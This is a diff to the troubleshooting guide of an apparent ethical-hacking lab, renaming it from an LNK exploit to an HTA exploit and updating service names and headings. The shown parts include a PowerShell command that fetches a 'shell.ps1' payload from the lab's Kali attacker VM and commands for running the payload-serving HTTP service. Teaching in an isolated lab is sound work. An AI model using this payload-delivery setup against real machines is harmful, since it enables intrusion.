@@ -1,7 +1,7 @@
 # Troubleshooting Guide
-## Ethical Hacking Lab - LNK Exploit
+## Ethical Hacking Lab - HTA Exploit
 
-This guide covers common issues with the LNK exploit lab and their solutions.
+This guide covers common issues with the HTA exploit lab and their solutions.
 
 ---
 
@@ -10,7 +10,7 @@ This guide covers common issues with the LNK exploit lab and their solutions.
 1. [Setup Issues](#setup-issues)
 2. [Network Problems](#network-problems)
 3. [VM Issues](#vm-issues)
-4. [LNK Exploit Problems](#lnk-exploit-problems)
+4. [HTA Exploit Problems](#lnk-exploit-problems)
 5. [Metasploit Issues](#metasploit-issues)
 6. [Performance Issues](#performance-issues)
 7. [General Tips](#general-tips)
@@ -194,7 +194,7 @@ ip addr show | grep 192.168.56.101
 vagrant ssh kali
 
 # Check service status
-sudo systemctl status lnk-http-server.service
+sudo systemctl status hta-http-server.service
 
 # Should show: Active: active (running)
 ```
@@ -202,10 +202,10 @@ sudo systemctl status lnk-http-server.service
 **If service is not running:**
 ```bash
 # Start the service
-sudo systemctl start lnk-http-server.service
+sudo systemctl start hta-http-server.service
 
 # Check for errors
-sudo journalctl -u lnk-http-server.service -n 50
+sudo journalctl -u hta-http-server.service -n 50
 ```
 
 ---
@@ -214,7 +214,7 @@ sudo journalctl -u lnk-http-server.service -n 50
 
 **Symptoms:**
 - `Invoke-WebRequest` fails
-- LNK exploit can't download payload
+- HTA exploit can't download payload
 
 **Diagnosis:**
 ```powershell
@@ -229,10 +229,10 @@ Invoke-WebRequest http://192.168.56.101:8080/shell.ps1
 ss -tuln | grep 8080
 
 # Check systemd service status
-sudo systemctl status lnk-http-server.service
+sudo systemctl status hta-http-server.service
 
 # If not running, start the service
-sudo systemctl start lnk-http-server.service
+sudo systemctl start hta-http-server.service
 
 # Or start manually if needed
 cd /home/vagrant/lnk_payloads
@@ -311,7 +311,7 @@ cd /vagrant/vagrant/provisioning/kali
 
 ---
 
-## LNK Exploit Problems
+## HTA Exploit Problems
 
 ### Issue: LNK file not created
 
@@ -707,4 +707,4 @@ Test-NetConnection 192.168.56.101 -Port 8080
 ---
 
 *Last Updated: 2026-01-09*
-*Version: 2.0 - LNK Exploit Lab*
+*Version: 2.0 - HTA Exploit Lab*
